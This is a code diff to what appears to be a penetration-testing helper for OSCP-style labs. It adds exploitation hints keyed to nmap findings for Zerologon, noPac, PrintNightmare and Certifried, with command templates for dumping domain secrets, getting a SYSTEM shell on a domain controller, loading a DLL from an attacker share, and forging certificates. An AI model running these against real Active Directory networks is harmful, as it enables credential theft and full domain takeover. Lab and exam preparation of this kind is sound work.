@@ -2611,6 +2611,41 @@ def _multiline_passes(path, report, store):
             "http-vuln-cve-2017-5638": ("Apache Struts2 (Jakarta)",
                 "PoC: metasploit exploit/multi/http/struts2_content_type_ognl "
                 "(one-target quota); manual: curl -H 'Content-Type: %{...}"),
+            # iter-233: modern AD-attack CVEs that show up on OSCP+
+            # retired AD labs. Hints call out the compliance trade-off
+            # explicitly - Zerologon breaks the DC for other testers,
+            # noPac is safe, PrintNightmare crashes spooler.
+            "smb-vuln-cve-2020-1472": ("Zerologon (CVE-2020-1472)",
+                "WARNING: exploit RESETS DC machine-account password to "
+                "empty then requires reset - if the restore fails it "
+                "BREAKS THE DC for every other exam taker on the shared "
+                "lab. On OSCP+ prefer noPac or Kerberoast paths instead. "
+                "If confirmed vuln + no other option: python "
+                "zerologon_tester.py <dc> <dc-netbios> checks; then "
+                "cve-2020-1472-exploit.py to reset; secretsdump.py -no-"
+                "pass -just-dc <domain>/<dc>\\$@<dc-ip>; restore "
+                "immediately with reinstall_original_pw.py"),
+            "smb-vuln-cve-2021-42278": ("noPac / sAMAccountName spoofing "
+                "(CVE-2021-42278 + 42287)",
+                "SAFE for shared labs - doesn't touch DC state. "
+                "impacket-noPac.py -dc-ip <dc-ip> <domain>/<user>:<pw> "
+                "-shell for direct SYSTEM shell on the DC. Requires ANY "
+                "domain user cred - windapsearch/kerbrute to enumerate "
+                "one first"),
+            "smb-vuln-cve-2021-1675": ("PrintNightmare (CVE-2021-1675 / "
+                "34527)",
+                "exam-legal path: python printnightmare.py <target> "
+                "<domain>/<user>:<pw> '\\\\<smb-attacker>\\share\\evil."
+                "dll' - drops the DLL to spooler which SYSTEM-executes. "
+                "WARNING: often crashes spooler; may DoS the printer "
+                "service for other testers. Prefer other paths if this "
+                "is a shared DC"),
+            "smb-vuln-cve-2022-26923": ("Certifried / cert-based DA "
+                "elevation (CVE-2022-26923)",
+                "exam-legal: certipy shadow auto -u <user>@<domain> -p "
+                "<pw> -account <machine>$; then Rubeus/impacket ask "
+                "PKINIT with the forged cert; direct DA. Requires AD CS "
+                "Enterprise CA reachable."),
         }
         _script_seen = set()
         for m in _NMAP_VULN_SCRIPT.finditer(text):
